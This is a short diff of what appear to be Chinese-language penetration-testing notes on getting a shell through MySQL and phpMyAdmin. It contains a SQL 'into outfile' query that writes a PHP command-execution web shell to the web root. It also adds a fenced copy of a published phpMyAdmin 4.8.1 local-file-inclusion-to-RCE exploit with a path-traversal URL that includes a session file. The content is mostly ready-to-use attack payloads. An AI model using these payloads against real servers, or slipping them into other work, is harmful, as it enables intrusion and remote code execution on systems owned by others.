@@ -7,8 +7,8 @@ select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php"
 - 拥有可写权限
 - 是union注入(如果是注入的话)
 
-
-
+exp
+```
 # Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
 # Date: 2018-06-21
 # Exploit Author: VulnSpy
@@ -21,3 +21,4 @@ select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php"
 1. Run SQL Query : select '<?php phpinfo();exit;?>'
 2. Include the session file :
 http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
+```
